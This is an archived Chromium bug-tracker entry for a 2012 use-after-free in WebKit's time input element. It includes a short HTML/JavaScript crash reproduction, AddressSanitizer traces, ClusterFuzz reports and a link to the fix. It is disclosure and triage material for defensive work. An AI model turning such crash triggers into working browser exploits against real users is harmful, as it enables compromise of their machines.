# Heap-use-after-free in WebCore::DateTimeEditElement::setEmptyValue

| Field | Value |
|-------|-------|
| **Issue ID** | [40069572](https://issues.chromium.org/issues/40069572) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink, Blink>Forms |
| **Reporter** | mi...@gmail.com |
| **Assignee** | yo...@chromium.org |
| **Created** | 2012-09-07 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

use-after-free in WebCore::DateTimeEditElement::setEmptyValue

**VERSION**  

Chrome Version: dev  

Operating System: linux 64bit

**REPRODUCTION CASE**

<html>
<head>
<script>
onload = function() {
el0=document.createElement('input')
document.body.appendChild(el0)
el0.type='time'
el0.setAttribute('x', 'x')
el0.addEventListener('blur', function(){ el0.setAttribute('y', 'y') }, false)
el0.addEventListener('focus', function(){ el0.removeAttribute('x') }, false)
el0.focus()
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

==13475== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffebb42280 at pc 0x555559bdad76 bp 0x7fffffff5f60 sp 0x7fffffff5f58  

READ of size 8 at 0x7fffebb42280 thread T0  

#0 0x555559bdad75 in WebCore::DateTimeEditElement::setEmptyValue(WebCore::StepRange const&, WebCore::DateComponents const&) ???:0  

#1 0x555559a83beb in WebCore::TimeInputType::updateInnerTextValue() ???:0  

#2 0x55555999d522 in WebCore::HTMLInputElement::parseAttribute(WebCore::Attribute const&) ???:0

0x7fffebb42280 is located 0 bytes inside of 136-byte region [0x7fffebb42280,0x7fffebb42308)  

freed by thread T0 here:  

#0 0x55555f3a9000 in operator delete(void\*) ??:0  

#1 0x555558a005aa in WebCore::ContainerNode::removeChildren() ???:0  

#2 0x555559bda022 in WebCore::DateTimeEditElement::layout(WebCore::StepRange const&, WebCore::DateComponents const&) ???:0  

#3 0x555559bdac7c in WebCore::DateTimeEditElement::setEmptyValue(WebCore::StepRange const&, WebCore::DateComponents const&)

## Attachments

- [0136.txt](attachments/0136.txt) (text/plain; charset=us-ascii, 13.9 KB)
- [0136.html](attachments/0136.html) (text/html; charset=us-ascii, 449 B)

## Timeline

### in...@chromium.org (2012-09-07)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-09-08)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-09-08)

report coming in https://cluster-fuzz.appspot.com/testcase?key=105847704

### in...@chromium.org (2012-09-08)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=105847704

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f81b870ba80
Crash State:
  - crash stack -
  WebCore::DateTimeEditElement::setEmptyValue
  WebCore::TimeInputType::updateInnerTextValue
  - free stack -
  WebCore::ContainerNode::removeChildren
  WebCore::DateTimeEditElement::layout
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=154424:154481

Minimized Testcase (0.38 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv95NkOxOMz9KkdkaD-xgcY_zb5J5ChVyjmcwtbJIhYrqBFjU2V7-_aok822SaNPJNd2wCRTRzsDMZq_JS8-P8BLBCYnQkNOMaKdT-ep7vc6tJdExbKS_0phcX5Vr46aEYyRcVHnaNn0Fx2sWxiNQc48Oxs02N8bPROIxmStEtEqUFBJa4CM
<script>
      onload = function() {
        el0=document.createElement('input')
        document.body.appendChild(el0)
        el0.type='time'
        el0.setAttribute('x', 'x')
        el0.addEventListener('blur', function(){ el0.setAttribute('y', 'y') }, false)
        el0.addEventListener('focus', function(){ el0.removeAttribute('x') }, false)
        el0.focus()
      }
    </script>

### yo...@chromium.org (2012-09-10)

The root cause is found in WebKit.
I'm fixing this bug in WebKit side and use following WebKit Bug:
https://bugs.webkit.org/show_bug.cgi?id=96232

### in...@chromium.org (2012-09-11)

http://trac.webkit.org/changeset/128148

### cl...@chromium.org (2012-09-12)

ClusterFuzz has detected this issue as fixed in range 156083:156123.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=105847704

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f81b870ba80
Crash State:
  - crash stack -
  WebCore::DateTimeEditElement::setEmptyValue
  WebCore::TimeInputType::updateInnerTextValue
  - free stack -
  WebCore::ContainerNode::removeChildren
  WebCore::DateTimeEditElement::layout
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=154424:154481
Fixed: https://cluster-fuzz.appspot.com/revisions?range=156083:156123

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv95NkOxOMz9KkdkaD-xgcY_zb5J5ChVyjmcwtbJIhYrqBFjU2V7-_aok822SaNPJNd2wCRTRzsDMZq_JS8-P8BLBCYnQkNOMaKdT-ep7vc6tJdExbKS_0phcX5Vr46aEYyRcVHnaNn0Fx2sWxiNQc48Oxs02N8bPROIxmStEtEqUFBJa4CM

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sc...@gmail.com (2012-09-14)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-09-25)

Weee! Nice regression catch @miaubiz and $1000 of course.

### sc...@gmail.com (2012-10-11)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-05)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-22)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/147290?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink, Blink>Forms]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40069572)*
